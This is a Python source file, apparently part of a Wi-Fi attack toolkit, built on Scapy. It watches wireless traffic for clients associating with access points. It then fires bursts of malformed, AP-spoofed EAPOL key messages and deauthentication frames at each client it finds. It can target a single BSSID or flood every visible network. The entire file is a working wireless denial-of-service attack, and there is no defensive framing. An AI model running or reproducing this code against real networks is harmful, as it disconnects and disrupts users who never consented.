# thats bad

import random
import threading
import time

from scapy.all import (
    EAPOL,
    Dot11,
    Dot11AssoReq,
    Dot11AssoResp,
    Dot11Deauth,
    RadioTap,
    sendp,
    sniff,
)
from scapy.error import Scapy_Exception

from debugs import debug

_BCAST = "ff:ff:ff:ff:ff:ff"

_VARIANTS = (
    (0x0029, 95, 1, 16),
    (0x0009, 95, 1, 16),
    (0x00A9, 95, 1, 16),
    (0x0069, 95, 1, 16),
    (0x0029, 95, 0, 16),
)

_BURST_MULT = 3
_HOT_WINDOW = 0.4
_INTER_CYCLE = 0.0005
_POLL_IDLE = 0.01
_DEAUTH_REASON = 7


def _build_bad_message(bssid, client, variant):
    key_info, eapol_len, replay, key_len = variant
    dot11 = Dot11(
        type=2, subtype=0,
        addr1=client, addr2=bssid, addr3=bssid,
        FCfield=0x02,
    )
    eapol = EAPOL(version=2, type=3, len=eapol_len)
    body = (
        b"\x02"
        + key_info.to_bytes(2, "big")
        + key_len.to_bytes(2, "big")
        + replay.to_bytes(8, "big")
        + bytes(random.getrandbits(8) for _ in range(32))
        + b"\x00" * 16
        + b"\x00" * 8
        + b"\x00" * 8
        + b"\x00" * 16
        + (0).to_bytes(2, "big")
    )
    return bytes(RadioTap() / dot11 / eapol / body)


def _build_deauth(bssid, client):
    return bytes(RadioTap() / Dot11(
        addr1=client, addr2=bssid, addr3=bssid,
    ) / Dot11Deauth(reason=_DEAUTH_REASON))


def _is_assoc_event(pkt, bssid, filter_bssid):
    if not pkt.haslayer(Dot11):
        return None
    try:
        d = pkt[Dot11]
        a1 = (d.addr1 or "").lower()
        a2 = (d.addr2 or "").lower()

        if pkt.haslayer(Dot11AssoReq):
            if filter_bssid:
                return a2 if (a1 == bssid and a2 and a2 != _BCAST) else None
            return a2 if (a2 and a2 != _BCAST and a1 != _BCAST) else None

        if pkt.haslayer(Dot11AssoResp):
            if filter_bssid:
                return a1 if (a2 == bssid and a1 and a1 != _BCAST) else None
            return a1 if (a1 and a1 != _BCAST) else None

        if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3:
            if filter_bssid:
                if a2 == bssid and a1 and a1 != _BCAST:
                    return a1
                if a1 == bssid and a2 and a2 != _BCAST:
                    return a2
            else:
                for cand in (a1, a2):
                    if cand and cand != _BCAST:
                        return cand
    except (AttributeError, IndexError, TypeError, Scapy_Exception):
        return None
    return None


def _run(iface, bssid, filter_bssid):
    bssid = (bssid or "").lower()
    stop = threading.Event()
    hot = {}
    hot_lock = threading.Lock()

    def _touch(client, ap):
        with hot_lock:
            hot[client] = {"ap": ap, "t": time.time()}

    def _handler(pkt):
        sta = _is_assoc_event(pkt, bssid, filter_bssid)
        if sta is None:
            return
        ap = bssid
        if not filter_bssid:
            try:
                d = pkt[Dot11]
                a1 = (d.addr1 or "").lower()
                a2 = (d.addr2 or "").lower()
                ap = a1 if a2 == sta else a2
                if not ap or ap == _BCAST:
                    ap = bssid
            except (AttributeError, IndexError, TypeError):
                ap = bssid
        _touch(sta, ap)

    def _sniffer():
        while not stop.is_set():
            try:
                sniff(iface=iface, prn=_handler, timeout=1, store=False)
            except (Scapy_Exception, OSError) as e:
                debug("critical", f"bad_message: sniff failed: {e}")
                stop.set()
                return

    def _tx_worker():
        cache = {}
        while not stop.is_set():
            now = time.time()
            with hot_lock:
                for c in [c for c, v in hot.items()
                          if now - v["t"] > _HOT_WINDOW]:
                    del hot[c]
                    cache.pop(c, None)
                snapshot = dict(hot)

            if not snapshot:
                time.sleep(_POLL_IDLE)
                continue

            for client, info in snapshot.items():
                if stop.is_set():
                    return
                ap = info["ap"]
                cached = cache.get(client)
                if not cached or cached[0] != ap:
                    base = [_build_bad_message(ap, client, v)
                            for v in _VARIANTS]
                    base.append(_build_deauth(ap, client))
                    burst = base * _BURST_MULT
                    cache[client] = (ap, burst)
                    cached = cache[client]
                try:
                    sendp(cached[1], iface=iface, verbose=False,
                          realtime=False, inter=0)
                    debug("ok", f"bad_message: Just Found Client-{client} and Attacked!")
                except (Scapy_Exception, OSError) as e:
                    debug("critical", f"bad_message: send failed: {e}")
                    stop.set()
                    return

            if _INTER_CYCLE:
                time.sleep(_INTER_CYCLE)

    debug("ok", f"bad_message: watching "
                f"{'targeted ' + bssid if filter_bssid else 'flood (all BSSIDs)'}")

    sniffer_thread = threading.Thread(target=_sniffer, daemon=True)
    tx_thread = threading.Thread(target=_tx_worker, daemon=True)

    sniffer_thread.start()
    tx_thread.start()

    try:
        while tx_thread.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        debug("info", "bad_message: interrupted")
    finally:
        stop.set()
        sniffer_thread.join(timeout=2)
        tx_thread.join(timeout=2)


def bad_message_targeted(iface, bssid, ssid=None):
    tag = f"{bssid}" + (f" ({ssid})" if ssid else "")
    debug("info", f"bad_message_targeted: {tag}")
    _run(iface, bssid, True)


def bad_message_flood(iface):
    debug("info", "bad_message_flood: all visible BSSIDs")
    _run(iface, None, False)